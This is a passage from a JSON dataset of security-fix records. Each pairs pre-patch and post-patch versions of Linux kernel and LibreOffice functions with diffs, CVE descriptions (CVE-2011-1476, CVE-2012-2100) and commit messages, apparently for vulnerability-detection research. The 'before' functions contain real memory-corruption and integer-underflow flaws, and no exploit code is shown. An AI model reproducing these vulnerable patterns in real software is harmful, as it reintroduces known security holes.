        "diff_func": "--- func_before\n+++ func_after\n@@ -21,10 +21,17 @@\n \n             if ( mnIdClusters-- > 2 )\n             {\n-                if ( aDggAtomHd.nRecLen == ( mnIdClusters * sizeof( FIDCL ) + 16 ) )\n+                const sal_Size nFIDCLsize = sizeof(sal_uInt32) * 2;\n+                if ( aDggAtomHd.nRecLen == ( mnIdClusters * nFIDCLsize + 16 ) )\n                 {\n+                    sal_Size nMaxEntriesPossible = rStCtrl.remainingSize() / nFIDCLsize;\n+                    SAL_WARN_IF(nMaxEntriesPossible < mnIdClusters,\n+                        \"escher\", \"FIDCL list longer than remaining bytes, ppt or parser is wrong\");\n+                    mnIdClusters = std::min(nMaxEntriesPossible, static_cast<sal_Size>(mnIdClusters));\n+\n                     mpFidcls = new FIDCL[ mnIdClusters ];\n-                    for ( sal_uInt32 i = 0; i < mnIdClusters; i++ )\n+                    memset(mpFidcls, 0, mnIdClusters * sizeof(FIDCL));\n+                    for (sal_uInt32 i = 0; i < mnIdClusters; ++i)\n                     {\n                         rStCtrl >> mpFidcls[ i ].dgid\n                                 >> mpFidcls[ i ].cspidCur;",
        "diff_line_info": {
            "deleted_lines": [
                "                if ( aDggAtomHd.nRecLen == ( mnIdClusters * sizeof( FIDCL ) + 16 ) )",
                "                    for ( sal_uInt32 i = 0; i < mnIdClusters; i++ )"
            ],
            "added_lines": [
                "                const sal_Size nFIDCLsize = sizeof(sal_uInt32) * 2;",
                "                if ( aDggAtomHd.nRecLen == ( mnIdClusters * nFIDCLsize + 16 ) )",
                "                    sal_Size nMaxEntriesPossible = rStCtrl.remainingSize() / nFIDCLsize;",
                "                    SAL_WARN_IF(nMaxEntriesPossible < mnIdClusters,",
                "                        \"escher\", \"FIDCL list longer than remaining bytes, ppt or parser is wrong\");",
                "                    mnIdClusters = std::min(nMaxEntriesPossible, static_cast<sal_Size>(mnIdClusters));",
                "",
                "                    memset(mpFidcls, 0, mnIdClusters * sizeof(FIDCL));",
                "                    for (sal_uInt32 i = 0; i < mnIdClusters; ++i)"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-1476",
        "func_name": "torvalds/linux/sequencer_write",
        "description": "Integer underflow in the Open Sound System (OSS) subsystem in the Linux kernel before 2.6.39 on unspecified non-x86 platforms allows local users to cause a denial of service (memory corruption) by leveraging write access to /dev/sequencer.",
        "git_url": "https://github.com/torvalds/linux/commit/b769f49463711205d57286e64cf535ed4daf59e9",
        "commit_title": "sound/oss: remove offset from load_patch callbacks",
        "commit_text": " Was: [PATCH] sound/oss/midi_synth: prevent underflow, use of uninitialized value, and signedness issue  The offset passed to midi_synth_load_patch() can be essentially arbitrary.  If it's greater than the header length, this will result in a copy_from_user(dst, src, negative_val).  While this will just return -EFAULT on x86, on other architectures this may cause memory corruption. Additionally, the length field of the sysex_info structure may not be initialized prior to its use.  Finally, a signed comparison may result in an unintentionally large loop.  On suggestion by Takashi Iwai, version two removes the offset argument from the load_patch callbacks entirely, which also resolves similar issues in opl3.  Compile tested only.  v3 adjusts comments and hopefully gets copy offsets right. ",
        "func_before": "int sequencer_write(int dev, struct file *file, const char __user *buf, int count)\n{\n\tunsigned char event_rec[EV_SZ], ev_code;\n\tint p = 0, c, ev_size;\n\tint mode = translate_mode(file);\n\n\tdev = dev >> 4;\n\n\tDEB(printk(\"sequencer_write(dev=%d, count=%d)\\n\", dev, count));\n\n\tif (mode == OPEN_READ)\n\t\treturn -EIO;\n\n\tc = count;\n\n\twhile (c >= 4)\n\t{\n\t\tif (copy_from_user((char *) event_rec, &(buf)[p], 4))\n\t\t\tgoto out;\n\t\tev_code = event_rec[0];\n\n\t\tif (ev_code == SEQ_FULLSIZE)\n\t\t{\n\t\t\tint err, fmt;\n\n\t\t\tdev = *(unsigned short *) &event_rec[2];\n\t\t\tif (dev < 0 || dev >= max_synthdev || synth_devs[dev] == NULL)\n\t\t\t\treturn -ENXIO;\n\n\t\t\tif (!(synth_open_mask & (1 << dev)))\n\t\t\t\treturn -ENXIO;\n\n\t\t\tfmt = (*(short *) &event_rec[0]) & 0xffff;\n\t\t\terr = synth_devs[dev]->load_patch(dev, fmt, buf, p + 4, c, 0);\n\t\t\tif (err < 0)\n\t\t\t\treturn err;\n\n\t\t\treturn err;\n\t\t}\n\t\tif (ev_code >= 128)\n\t\t{\n\t\t\tif (seq_mode == SEQ_2 && ev_code == SEQ_EXTENDED)\n\t\t\t{\n\t\t\t\tprintk(KERN_WARNING \"Sequencer: Invalid level 2 event %x\\n\", ev_code);\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\t\t\tev_size = 8;\n\n\t\t\tif (c < ev_size)\n\t\t\t{\n\t\t\t\tif (!seq_playing)\n\t\t\t\t\tseq_startplay();\n\t\t\t\treturn count - c;\n\t\t\t}\n\t\t\tif (copy_from_user((char *)&event_rec[4],\n\t\t\t\t\t   &(buf)[p + 4], 4))\n\t\t\t\tgoto out;\n\n\t\t}\n\t\telse\n\t\t{\n\t\t\tif (seq_mode == SEQ_2)\n\t\t\t{\n\t\t\t\tprintk(KERN_WARNING \"Sequencer: 4 byte event in level 2 mode\\n\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\t\t\tev_size = 4;\n\n\t\t\tif (event_rec[0] != SEQ_MIDIPUTC)\n\t\t\t\tobsolete_api_used = 1;\n\t\t}\n\n\t\tif (event_rec[0] == SEQ_MIDIPUTC)\n\t\t{\n\t\t\tif (!midi_opened[event_rec[2]])\n\t\t\t{\n\t\t\t\tint err, mode;\n\t\t\t\tint dev = event_rec[2];\n\n\t\t\t\tif (dev >= max_mididev || midi_devs[dev]==NULL)\n\t\t\t\t{\n\t\t\t\t\t/*printk(\"Sequencer Error: Nonexistent MIDI device %d\\n\", dev);*/\n\t\t\t\t\treturn -ENXIO;\n\t\t\t\t}\n\t\t\t\tmode = translate_mode(file);\n\n\t\t\t\tif ((err = midi_devs[dev]->open(dev, mode,\n\t\t\t\t\t\t\t\tsequencer_midi_input, sequencer_midi_output)) < 0)\n\t\t\t\t{\n\t\t\t\t\tseq_reset();\n\t\t\t\t\tprintk(KERN_WARNING \"Sequencer Error: Unable to open Midi #%d\\n\", dev);\n\t\t\t\t\treturn err;\n\t\t\t\t}\n\t\t\t\tmidi_opened[dev] = 1;\n\t\t\t}\n\t\t}\n\t\tif (!seq_queue(event_rec, (file->f_flags & (O_NONBLOCK) ? 1 : 0)))\n\t\t{\n\t\t\tint processed = count - c;\n\n\t\t\tif (!seq_playing)\n\t\t\t\tseq_startplay();\n\n\t\t\tif (!processed && (file->f_flags & O_NONBLOCK))\n\t\t\t\treturn -EAGAIN;\n\t\t\telse\n\t\t\t\treturn processed;\n\t\t}\n\t\tp += ev_size;\n\t\tc -= ev_size;\n\t}\n\n\tif (!seq_playing)\n\t\tseq_startplay();\nout:\n\treturn count;\n}",
        "func": "int sequencer_write(int dev, struct file *file, const char __user *buf, int count)\n{\n\tunsigned char event_rec[EV_SZ], ev_code;\n\tint p = 0, c, ev_size;\n\tint mode = translate_mode(file);\n\n\tdev = dev >> 4;\n\n\tDEB(printk(\"sequencer_write(dev=%d, count=%d)\\n\", dev, count));\n\n\tif (mode == OPEN_READ)\n\t\treturn -EIO;\n\n\tc = count;\n\n\twhile (c >= 4)\n\t{\n\t\tif (copy_from_user((char *) event_rec, &(buf)[p], 4))\n\t\t\tgoto out;\n\t\tev_code = event_rec[0];\n\n\t\tif (ev_code == SEQ_FULLSIZE)\n\t\t{\n\t\t\tint err, fmt;\n\n\t\t\tdev = *(unsigned short *) &event_rec[2];\n\t\t\tif (dev < 0 || dev >= max_synthdev || synth_devs[dev] == NULL)\n\t\t\t\treturn -ENXIO;\n\n\t\t\tif (!(synth_open_mask & (1 << dev)))\n\t\t\t\treturn -ENXIO;\n\n\t\t\tfmt = (*(short *) &event_rec[0]) & 0xffff;\n\t\t\terr = synth_devs[dev]->load_patch(dev, fmt, buf + p, c, 0);\n\t\t\tif (err < 0)\n\t\t\t\treturn err;\n\n\t\t\treturn err;\n\t\t}\n\t\tif (ev_code >= 128)\n\t\t{\n\t\t\tif (seq_mode == SEQ_2 && ev_code == SEQ_EXTENDED)\n\t\t\t{\n\t\t\t\tprintk(KERN_WARNING \"Sequencer: Invalid level 2 event %x\\n\", ev_code);\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\t\t\tev_size = 8;\n\n\t\t\tif (c < ev_size)\n\t\t\t{\n\t\t\t\tif (!seq_playing)\n\t\t\t\t\tseq_startplay();\n\t\t\t\treturn count - c;\n\t\t\t}\n\t\t\tif (copy_from_user((char *)&event_rec[4],\n\t\t\t\t\t   &(buf)[p + 4], 4))\n\t\t\t\tgoto out;\n\n\t\t}\n\t\telse\n\t\t{\n\t\t\tif (seq_mode == SEQ_2)\n\t\t\t{\n\t\t\t\tprintk(KERN_WARNING \"Sequencer: 4 byte event in level 2 mode\\n\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\t\t\tev_size = 4;\n\n\t\t\tif (event_rec[0] != SEQ_MIDIPUTC)\n\t\t\t\tobsolete_api_used = 1;\n\t\t}\n\n\t\tif (event_rec[0] == SEQ_MIDIPUTC)\n\t\t{\n\t\t\tif (!midi_opened[event_rec[2]])\n\t\t\t{\n\t\t\t\tint err, mode;\n\t\t\t\tint dev = event_rec[2];\n\n\t\t\t\tif (dev >= max_mididev || midi_devs[dev]==NULL)\n\t\t\t\t{\n\t\t\t\t\t/*printk(\"Sequencer Error: Nonexistent MIDI device %d\\n\", dev);*/\n\t\t\t\t\treturn -ENXIO;\n\t\t\t\t}\n\t\t\t\tmode = translate_mode(file);\n\n\t\t\t\tif ((err = midi_devs[dev]->open(dev, mode,\n\t\t\t\t\t\t\t\tsequencer_midi_input, sequencer_midi_output)) < 0)\n\t\t\t\t{\n\t\t\t\t\tseq_reset();\n\t\t\t\t\tprintk(KERN_WARNING \"Sequencer Error: Unable to open Midi #%d\\n\", dev);\n\t\t\t\t\treturn err;\n\t\t\t\t}\n\t\t\t\tmidi_opened[dev] = 1;\n\t\t\t}\n\t\t}\n\t\tif (!seq_queue(event_rec, (file->f_flags & (O_NONBLOCK) ? 1 : 0)))\n\t\t{\n\t\t\tint processed = count - c;\n\n\t\t\tif (!seq_playing)\n\t\t\t\tseq_startplay();\n\n\t\t\tif (!processed && (file->f_flags & O_NONBLOCK))\n\t\t\t\treturn -EAGAIN;\n\t\t\telse\n\t\t\t\treturn processed;\n\t\t}\n\t\tp += ev_size;\n\t\tc -= ev_size;\n\t}\n\n\tif (!seq_playing)\n\t\tseq_startplay();\nout:\n\treturn count;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -31,7 +31,7 @@\n \t\t\t\treturn -ENXIO;\n \n \t\t\tfmt = (*(short *) &event_rec[0]) & 0xffff;\n-\t\t\terr = synth_devs[dev]->load_patch(dev, fmt, buf, p + 4, c, 0);\n+\t\t\terr = synth_devs[dev]->load_patch(dev, fmt, buf + p, c, 0);\n \t\t\tif (err < 0)\n \t\t\t\treturn err;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\terr = synth_devs[dev]->load_patch(dev, fmt, buf, p + 4, c, 0);"
            ],
            "added_lines": [
                "\t\t\terr = synth_devs[dev]->load_patch(dev, fmt, buf + p, c, 0);"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-1476",
        "func_name": "torvalds/linux/midi_synth_load_patch",
        "description": "Integer underflow in the Open Sound System (OSS) subsystem in the Linux kernel before 2.6.39 on unspecified non-x86 platforms allows local users to cause a denial of service (memory corruption) by leveraging write access to /dev/sequencer.",
        "git_url": "https://github.com/torvalds/linux/commit/b769f49463711205d57286e64cf535ed4daf59e9",
        "commit_title": "sound/oss: remove offset from load_patch callbacks",
        "commit_text": " Was: [PATCH] sound/oss/midi_synth: prevent underflow, use of uninitialized value, and signedness issue  The offset passed to midi_synth_load_patch() can be essentially arbitrary.  If it's greater than the header length, this will result in a copy_from_user(dst, src, negative_val).  While this will just return -EFAULT on x86, on other architectures this may cause memory corruption. Additionally, the length field of the sysex_info structure may not be initialized prior to its use.  Finally, a signed comparison may result in an unintentionally large loop.  On suggestion by Takashi Iwai, version two removes the offset argument from the load_patch callbacks entirely, which also resolves similar issues in opl3.  Compile tested only.  v3 adjusts comments and hopefully gets copy offsets right. ",
        "func_before": "int\nmidi_synth_load_patch(int dev, int format, const char __user *addr,\n\t\t      int offs, int count, int pmgr_flag)\n{\n\tint             orig_dev = synth_devs[dev]->midi_dev;\n\n\tstruct sysex_info sysex;\n\tint             i;\n\tunsigned long   left, src_offs, eox_seen = 0;\n\tint             first_byte = 1;\n\tint             hdr_size = (unsigned long) &sysex.data[0] - (unsigned long) &sysex;\n\n\tleave_sysex(dev);\n\n\tif (!prefix_cmd(orig_dev, 0xf0))\n\t\treturn 0;\n\n\tif (format != SYSEX_PATCH)\n\t{\n/*\t\t  printk(\"MIDI Error: Invalid patch format (key) 0x%x\\n\", format);*/\n\t\t  return -EINVAL;\n\t}\n\tif (count < hdr_size)\n\t{\n/*\t\tprintk(\"MIDI Error: Patch header too short\\n\");*/\n\t\treturn -EINVAL;\n\t}\n\tcount -= hdr_size;\n\n\t/*\n\t * Copy the header from user space but ignore the first bytes which have\n\t * been transferred already.\n\t */\n\n\tif(copy_from_user(&((char *) &sysex)[offs], &(addr)[offs], hdr_size - offs))\n\t\treturn -EFAULT;\n \n \tif (count < sysex.len)\n\t{\n/*\t\tprintk(KERN_WARNING \"MIDI Warning: Sysex record too short (%d<%d)\\n\", count, (int) sysex.len);*/\n\t\tsysex.len = count;\n\t}\n  \tleft = sysex.len;\n  \tsrc_offs = 0;\n\n\tfor (i = 0; i < left && !signal_pending(current); i++)\n\t{\n\t\tunsigned char   data;\n\n\t\tif (get_user(data,\n\t\t    (unsigned char __user *)(addr + hdr_size + i)))\n\t\t\treturn -EFAULT;\n\n\t\teox_seen = (i > 0 && data & 0x80);\t/* End of sysex */\n\n\t\tif (eox_seen && data != 0xf7)\n\t\t\tdata = 0xf7;\n\n\t\tif (i == 0)\n\t\t{\n\t\t\tif (data != 0xf0)\n\t\t\t{\n\t\t\t\tprintk(KERN_WARNING \"midi_synth: Sysex start missing\\n\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\t\t}\n\t\twhile (!midi_devs[orig_dev]->outputc(orig_dev, (unsigned char) (data & 0xff)) &&\n\t\t\t!signal_pending(current))\n\t\t\tschedule();\n\n\t\tif (!first_byte && data & 0x80)\n\t\t\treturn 0;\n\t\tfirst_byte = 0;\n\t}\n\n\tif (!eox_seen)\n\t\tmidi_outc(orig_dev, 0xf7);\n\treturn 0;\n}",
        "func": "int\nmidi_synth_load_patch(int dev, int format, const char __user *addr,\n\t\t      int count, int pmgr_flag)\n{\n\tint             orig_dev = synth_devs[dev]->midi_dev;\n\n\tstruct sysex_info sysex;\n\tint             i;\n\tunsigned long   left, src_offs, eox_seen = 0;\n\tint             first_byte = 1;\n\tint             hdr_size = (unsigned long) &sysex.data[0] - (unsigned long) &sysex;\n\n\tleave_sysex(dev);\n\n\tif (!prefix_cmd(orig_dev, 0xf0))\n\t\treturn 0;\n\n\t/* Invalid patch format */\n\tif (format != SYSEX_PATCH)\n\t\t  return -EINVAL;\n\n\t/* Patch header too short */\n\tif (count < hdr_size)\n\t\treturn -EINVAL;\n\n\tcount -= hdr_size;\n\n\t/*\n\t * Copy the header from user space\n\t */\n\n\tif (copy_from_user(&sysex, addr, hdr_size))\n\t\treturn -EFAULT;\n\n\t/* Sysex record too short */\n\tif ((unsigned)count < (unsigned)sysex.len)\n\t\tsysex.len = count;\n\n\tleft = sysex.len;\n\tsrc_offs = 0;\n\n\tfor (i = 0; i < left && !signal_pending(current); i++)\n\t{\n\t\tunsigned char   data;\n\n\t\tif (get_user(data,\n\t\t    (unsigned char __user *)(addr + hdr_size + i)))\n\t\t\treturn -EFAULT;\n\n\t\teox_seen = (i > 0 && data & 0x80);\t/* End of sysex */\n\n\t\tif (eox_seen && data != 0xf7)\n\t\t\tdata = 0xf7;\n\n\t\tif (i == 0)\n\t\t{\n\t\t\tif (data != 0xf0)\n\t\t\t{\n\t\t\t\tprintk(KERN_WARNING \"midi_synth: Sysex start missing\\n\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\t\t}\n\t\twhile (!midi_devs[orig_dev]->outputc(orig_dev, (unsigned char) (data & 0xff)) &&\n\t\t\t!signal_pending(current))\n\t\t\tschedule();\n\n\t\tif (!first_byte && data & 0x80)\n\t\t\treturn 0;\n\t\tfirst_byte = 0;\n\t}\n\n\tif (!eox_seen)\n\t\tmidi_outc(orig_dev, 0xf7);\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,6 +1,6 @@\n int\n midi_synth_load_patch(int dev, int format, const char __user *addr,\n-\t\t      int offs, int count, int pmgr_flag)\n+\t\t      int count, int pmgr_flag)\n {\n \tint             orig_dev = synth_devs[dev]->midi_dev;\n \n@@ -15,33 +15,29 @@\n \tif (!prefix_cmd(orig_dev, 0xf0))\n \t\treturn 0;\n \n+\t/* Invalid patch format */\n \tif (format != SYSEX_PATCH)\n-\t{\n-/*\t\t  printk(\"MIDI Error: Invalid patch format (key) 0x%x\\n\", format);*/\n \t\t  return -EINVAL;\n-\t}\n+\n+\t/* Patch header too short */\n \tif (count < hdr_size)\n-\t{\n-/*\t\tprintk(\"MIDI Error: Patch header too short\\n\");*/\n \t\treturn -EINVAL;\n-\t}\n+\n \tcount -= hdr_size;\n \n \t/*\n-\t * Copy the header from user space but ignore the first bytes which have\n-\t * been transferred already.\n+\t * Copy the header from user space\n \t */\n \n-\tif(copy_from_user(&((char *) &sysex)[offs], &(addr)[offs], hdr_size - offs))\n+\tif (copy_from_user(&sysex, addr, hdr_size))\n \t\treturn -EFAULT;\n- \n- \tif (count < sysex.len)\n-\t{\n-/*\t\tprintk(KERN_WARNING \"MIDI Warning: Sysex record too short (%d<%d)\\n\", count, (int) sysex.len);*/\n+\n+\t/* Sysex record too short */\n+\tif ((unsigned)count < (unsigned)sysex.len)\n \t\tsysex.len = count;\n-\t}\n-  \tleft = sysex.len;\n-  \tsrc_offs = 0;\n+\n+\tleft = sysex.len;\n+\tsrc_offs = 0;\n \n \tfor (i = 0; i < left && !signal_pending(current); i++)\n \t{",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t      int offs, int count, int pmgr_flag)",
                "\t{",
                "/*\t\t  printk(\"MIDI Error: Invalid patch format (key) 0x%x\\n\", format);*/",
                "\t}",
                "\t{",
                "/*\t\tprintk(\"MIDI Error: Patch header too short\\n\");*/",
                "\t}",
                "\t * Copy the header from user space but ignore the first bytes which have",
                "\t * been transferred already.",
                "\tif(copy_from_user(&((char *) &sysex)[offs], &(addr)[offs], hdr_size - offs))",
                " ",
                " \tif (count < sysex.len)",
                "\t{",
                "/*\t\tprintk(KERN_WARNING \"MIDI Warning: Sysex record too short (%d<%d)\\n\", count, (int) sysex.len);*/",
                "\t}",
                "  \tleft = sysex.len;",
                "  \tsrc_offs = 0;"
            ],
            "added_lines": [
                "\t\t      int count, int pmgr_flag)",
                "\t/* Invalid patch format */",
                "",
                "\t/* Patch header too short */",
                "",
                "\t * Copy the header from user space",
                "\tif (copy_from_user(&sysex, addr, hdr_size))",
                "",
                "\t/* Sysex record too short */",
                "\tif ((unsigned)count < (unsigned)sysex.len)",
                "",
                "\tleft = sysex.len;",
                "\tsrc_offs = 0;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-1476",
        "func_name": "torvalds/linux/opl3_load_patch",
        "description": "Integer underflow in the Open Sound System (OSS) subsystem in the Linux kernel before 2.6.39 on unspecified non-x86 platforms allows local users to cause a denial of service (memory corruption) by leveraging write access to /dev/sequencer.",
        "git_url": "https://github.com/torvalds/linux/commit/b769f49463711205d57286e64cf535ed4daf59e9",
        "commit_title": "sound/oss: remove offset from load_patch callbacks",
        "commit_text": " Was: [PATCH] sound/oss/midi_synth: prevent underflow, use of uninitialized value, and signedness issue  The offset passed to midi_synth_load_patch() can be essentially arbitrary.  If it's greater than the header length, this will result in a copy_from_user(dst, src, negative_val).  While this will just return -EFAULT on x86, on other architectures this may cause memory corruption. Additionally, the length field of the sysex_info structure may not be initialized prior to its use.  Finally, a signed comparison may result in an unintentionally large loop.  On suggestion by Takashi Iwai, version two removes the offset argument from the load_patch callbacks entirely, which also resolves similar issues in opl3.  Compile tested only.  v3 adjusts comments and hopefully gets copy offsets right. ",
        "func_before": "static int opl3_load_patch(int dev, int format, const char __user *addr,\n\t\tint offs, int count, int pmgr_flag)\n{\n\tstruct sbi_instrument ins;\n\n\tif (count <sizeof(ins))\n\t{\n\t\tprintk(KERN_WARNING \"FM Error: Patch record too short\\n\");\n\t\treturn -EINVAL;\n\t}\n\n\t/*\n\t * What the fuck is going on here?  We leave junk in the beginning\n\t * of ins and then check the field pretty close to that beginning?\n\t */\n\tif(copy_from_user(&((char *) &ins)[offs], addr + offs, sizeof(ins) - offs))\n\t\treturn -EFAULT;\n\n\tif (ins.channel < 0 || ins.channel >= SBFM_MAXINSTR)\n\t{\n\t\tprintk(KERN_WARNING \"FM Error: Invalid instrument number %d\\n\", ins.channel);\n\t\treturn -EINVAL;\n\t}\n\tins.key = format;\n\n\treturn store_instr(ins.channel, &ins);\n}",
        "func": "static int opl3_load_patch(int dev, int format, const char __user *addr,\n\t\tint count, int pmgr_flag)\n{\n\tstruct sbi_instrument ins;\n\n\tif (count <sizeof(ins))\n\t{\n\t\tprintk(KERN_WARNING \"FM Error: Patch record too short\\n\");\n\t\treturn -EINVAL;\n\t}\n\n\tif (copy_from_user(&ins, addr, sizeof(ins)))\n\t\treturn -EFAULT;\n\n\tif (ins.channel < 0 || ins.channel >= SBFM_MAXINSTR)\n\t{\n\t\tprintk(KERN_WARNING \"FM Error: Invalid instrument number %d\\n\", ins.channel);\n\t\treturn -EINVAL;\n\t}\n\tins.key = format;\n\n\treturn store_instr(ins.channel, &ins);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,5 +1,5 @@\n static int opl3_load_patch(int dev, int format, const char __user *addr,\n-\t\tint offs, int count, int pmgr_flag)\n+\t\tint count, int pmgr_flag)\n {\n \tstruct sbi_instrument ins;\n \n@@ -9,11 +9,7 @@\n \t\treturn -EINVAL;\n \t}\n \n-\t/*\n-\t * What the fuck is going on here?  We leave junk in the beginning\n-\t * of ins and then check the field pretty close to that beginning?\n-\t */\n-\tif(copy_from_user(&((char *) &ins)[offs], addr + offs, sizeof(ins) - offs))\n+\tif (copy_from_user(&ins, addr, sizeof(ins)))\n \t\treturn -EFAULT;\n \n \tif (ins.channel < 0 || ins.channel >= SBFM_MAXINSTR)",
        "diff_line_info": {
            "deleted_lines": [
                "\t\tint offs, int count, int pmgr_flag)",
                "\t/*",
                "\t * What the fuck is going on here?  We leave junk in the beginning",
                "\t * of ins and then check the field pretty close to that beginning?",
                "\t */",
                "\tif(copy_from_user(&((char *) &ins)[offs], addr + offs, sizeof(ins) - offs))"
            ],
            "added_lines": [
                "\t\tint count, int pmgr_flag)",
                "\tif (copy_from_user(&ins, addr, sizeof(ins)))"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2100",
        "func_name": "torvalds/linux/ext4_fill_flex_info",
        "description": "The ext4_fill_flex_info function in fs/ext4/super.c in the Linux kernel before 3.2.2, on the x86 platform and unspecified other platforms, allows user-assisted remote attackers to trigger inconsistent filesystem-groups data and possibly cause a denial of service via a malformed ext4 filesystem containing a super block with a large FLEX_BG group size (aka s_log_groups_per_flex value).  NOTE: this vulnerability exists because of an incomplete fix for CVE-2009-4307.",
        "git_url": "https://github.com/torvalds/linux/commit/d50f2ab6f050311dbf7b8f5501b25f0bf64a439b",
        "commit_title": "ext4: fix undefined behavior in ext4_fill_flex_info()",
        "commit_text": " Commit 503358ae01b70ce6909d19dd01287093f6b6271c (\"ext4: avoid divide by zero when trying to mount a corrupted file system\") fixes CVE-2009-4307 by performing a sanity check on s_log_groups_per_flex, since it can be set to a bogus value by an attacker.  \tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex; \tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;  \tif (groups_per_flex < 2) { ... }  This patch fixes two potential issues in the previous commit.  1) The sanity check might only work on architectures like PowerPC. On x86, 5 bits are used for the shifting amount.  That means, given a large s_log_groups_per_flex value like 36, groups_per_flex = 1 << 36 is essentially 1 << 4 = 16, rather than 0.  This will bypass the check, leaving s_log_groups_per_flex and groups_per_flex inconsistent.  2) The sanity check relies on undefined behavior, i.e., oversized shift. A standard-confirming C compiler could rewrite the check in unexpected ways.  Consider the following equivalent form, assuming groups_per_flex is unsigned for simplicity.  \tgroups_per_flex = 1 << sbi->s_log_groups_per_flex; \tif (groups_per_flex == 0 || groups_per_flex == 1) {  We compile the code snippet using Clang 3.0 and GCC 4.6.  Clang will completely optimize away the check groups_per_flex == 0, leaving the patched code as vulnerable as the original.  GCC keeps the check, but there is no guarantee that future versions will do the same.  Cc: stable@vger.kernel.org",
        "func_before": "static int ext4_fill_flex_info(struct super_block *sb)\n{\n\tstruct ext4_sb_info *sbi = EXT4_SB(sb);\n\tstruct ext4_group_desc *gdp = NULL;\n\text4_group_t flex_group_count;\n\text4_group_t flex_group;\n\tint groups_per_flex = 0;\n\tsize_t size;\n\tint i;\n\n\tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n\n\tif (groups_per_flex < 2) {\n\t\tsbi->s_log_groups_per_flex = 0;\n\t\treturn 1;\n\t}\n\n\t/* We allocate both existing and potentially added groups */\n\tflex_group_count = ((sbi->s_groups_count + groups_per_flex - 1) +\n\t\t\t((le16_to_cpu(sbi->s_es->s_reserved_gdt_blocks) + 1) <<\n\t\t\t      EXT4_DESC_PER_BLOCK_BITS(sb))) / groups_per_flex;\n\tsize = flex_group_count * sizeof(struct flex_groups);\n\tsbi->s_flex_groups = ext4_kvzalloc(size, GFP_KERNEL);\n\tif (sbi->s_flex_groups == NULL) {\n\t\text4_msg(sb, KERN_ERR, \"not enough memory for %u flex groups\",\n\t\t\t flex_group_count);\n\t\tgoto failed;\n\t}\n\n\tfor (i = 0; i < sbi->s_groups_count; i++) {\n\t\tgdp = ext4_get_group_desc(sb, i, NULL);\n\n\t\tflex_group = ext4_flex_group(sbi, i);\n\t\tatomic_add(ext4_free_inodes_count(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].free_inodes);\n\t\tatomic_add(ext4_free_group_clusters(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].free_clusters);\n\t\tatomic_add(ext4_used_dirs_count(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].used_dirs);\n\t}\n\n\treturn 1;\nfailed:\n\treturn 0;\n}",
        "func": "static int ext4_fill_flex_info(struct super_block *sb)\n{\n\tstruct ext4_sb_info *sbi = EXT4_SB(sb);\n\tstruct ext4_group_desc *gdp = NULL;\n\text4_group_t flex_group_count;\n\text4_group_t flex_group;\n\tunsigned int groups_per_flex = 0;\n\tsize_t size;\n\tint i;\n\n\tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n\tif (sbi->s_log_groups_per_flex < 1 || sbi->s_log_groups_per_flex > 31) {\n\t\tsbi->s_log_groups_per_flex = 0;\n\t\treturn 1;\n\t}\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n\n\t/* We allocate both existing and potentially added groups */\n\tflex_group_count = ((sbi->s_groups_count + groups_per_flex - 1) +\n\t\t\t((le16_to_cpu(sbi->s_es->s_reserved_gdt_blocks) + 1) <<\n\t\t\t      EXT4_DESC_PER_BLOCK_BITS(sb))) / groups_per_flex;\n\tsize = flex_group_count * sizeof(struct flex_groups);\n\tsbi->s_flex_groups = ext4_kvzalloc(size, GFP_KERNEL);\n\tif (sbi->s_flex_groups == NULL) {\n\t\text4_msg(sb, KERN_ERR, \"not enough memory for %u flex groups\",\n\t\t\t flex_group_count);\n\t\tgoto failed;\n\t}\n\n\tfor (i = 0; i < sbi->s_groups_count; i++) {\n\t\tgdp = ext4_get_group_desc(sb, i, NULL);\n\n\t\tflex_group = ext4_flex_group(sbi, i);\n\t\tatomic_add(ext4_free_inodes_count(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].free_inodes);\n\t\tatomic_add(ext4_free_group_clusters(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].free_clusters);\n\t\tatomic_add(ext4_used_dirs_count(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].used_dirs);\n\t}\n\n\treturn 1;\nfailed:\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -4,17 +4,16 @@\n \tstruct ext4_group_desc *gdp = NULL;\n \text4_group_t flex_group_count;\n \text4_group_t flex_group;\n-\tint groups_per_flex = 0;\n+\tunsigned int groups_per_flex = 0;\n \tsize_t size;\n \tint i;\n \n \tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n-\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n-\n-\tif (groups_per_flex < 2) {\n+\tif (sbi->s_log_groups_per_flex < 1 || sbi->s_log_groups_per_flex > 31) {\n \t\tsbi->s_log_groups_per_flex = 0;\n \t\treturn 1;\n \t}\n+\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n \n \t/* We allocate both existing and potentially added groups */\n \tflex_group_count = ((sbi->s_groups_count + groups_per_flex - 1) +",
        "diff_line_info": {
            "deleted_lines": [
                "\tint groups_per_flex = 0;",
                "\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;",
                "",
